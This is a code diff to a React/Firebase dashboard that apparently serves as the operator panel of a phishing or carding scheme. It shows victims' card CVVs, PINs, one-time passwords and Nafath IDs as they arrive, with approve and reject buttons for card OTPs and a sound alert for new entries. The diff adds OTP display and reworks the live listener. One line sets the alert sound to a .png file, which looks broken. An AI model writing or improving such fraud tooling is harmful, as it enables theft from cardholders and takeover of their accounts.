@@ -35,13 +35,13 @@ type UserData = {
   expiryDate?: string
   operator?: string
   phoneOtp?: string
+ otp?: string
   nafadId?: string
   authNumber?: string
   cardOtpApproval?: "pending" | "approved" | "rejected"
   phoneOtpApproval?: "pending" | "approved" | "rejected"
   phoneSubmitted?: boolean // Added for phone submission status
   color?: string
- otp?: string
 }
 
 const getRandomColor = () => {
@@ -68,13 +68,19 @@ export default function DashboardPage() {
   const [readFilter, setReadFilter] = useState<string>("all")
   const [cardFilter, setCardFilter] = useState<string>("all")
   const audioRef = useRef<HTMLAudioElement | null>(null) as React.MutableRefObject<HTMLAudioElement | null>;
-
   const [editingAuthNumber, setEditingAuthNumber] = useState(false)
   const [authNumberValue, setAuthNumberValue] = useState("")
+  const prevUnreadCountRef = useRef(0)
 
   useEffect(() => {
-    audioRef.current = new Audio("/notification.mp3")
-    audioRef.current.volume = 0.5
+    const audio = new Audio()
+    audio.volume = 0.5
+    audioRef.current = audio
+
+    return () => {
+      audio.pause()
+      audio.src = ""
+    }
   }, [])
 
   useEffect(() => {
@@ -84,7 +90,6 @@ export default function DashboardPage() {
       q,
       (snapshot) => {
         const userData: UserData[] = []
-        let hasNewUnread = false
 
         snapshot.forEach((doc) => {
           const data = doc.data()
@@ -105,39 +110,43 @@ export default function DashboardPage() {
             processedData.color = getRandomColor()
           }
 
-          if (!processedData.isRead) {
-            hasNewUnread = true
-          }
-
           userData.push(processedData as UserData)
         })
 
-        const prevUnreadCount = users.filter((u) => !u.isRead).length
         const newUnreadCount = userData.filter((u) => !u.isRead).length
 
-        if (newUnreadCount > prevUnreadCount && users.length > 0 && audioRef.current) {
-          audioRef.current.play().catch((err) => console.log("[v0] Audio play failed:", err))
+        if (newUnreadCount > prevUnreadCountRef.current && prevUnreadCountRef.current > 0) {
+          // Play notification sound using placeholder
+          if (audioRef.current) {
+            audioRef.current.src = "/notification-sound.png"
+            audioRef.current.play().catch(() => {
+              // Silently fail if audio can't play
+            })
+          }
         }
 
+        prevUnreadCountRef.current = newUnreadCount
+
         setUsers(userData)
-        if (selectedUser) {
-          const updatedUser = userData.find((u) => u.id === selectedUser.id)
-          if (updatedUser) {
-            setSelectedUser(updatedUser)
+
+        setSelectedUser((prevSelected) => {
+          if (prevSelected) {
+            const updatedUser = userData.find((u) => u.id === prevSelected.id)
+            return updatedUser || prevSelected
           }
-        } else if (userData.length > 0) {
-          setSelectedUser(userData[0])
-        }
+          return userData.length > 0 ? userData[0] : null
+        })
+
         setLoading(false)
       },
       (error) => {
-        console.error("[v0] Firebase error:", error)
+        console.error("Firebase error:", error)
         setLoading(false)
       },
     )
 
     return () => unsubscribe()
-  }, [users.length])
+  }, []) // Empty dependency array prevents listener recreation
 
   const filteredUsers = users.filter((user) => {
     const matchesSearch =
@@ -707,16 +716,22 @@ export default function DashboardPage() {
                         <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                           <span className="text-muted-foreground font-medium">CVV:</span>
                           <span className="text-foreground font-bold font-mono">
-              {selectedUser.cvv}
+                       {selectedUser.cvv}
                           </span>
                         </div>
                       )}
-                      {selectedUser.otp && (
+                      {selectedUser.otp&& (
                         <div className="flex flex-col gap-3 pt-3 border-t border-border/30">
                           <div className="flex justify-between gap-12">
                             <span className="text-muted-foreground font-medium">الرقم السري:</span>
                             <span className="text-foreground font-bold font-mono">
-                            {selectedUser.pin}
+                              {selectedUser?.pin}
+                            </span>
+                          </div>
+                          <div className="flex justify-between gap-12">
+                            <span className="text-muted-foreground font-medium">otp:</span>
+                            <span className="text-foreground font-bold font-mono">
+                              {selectedUser?.otp}
                             </span>
                           </div>
                           {/* Approval buttons for card OTP */}
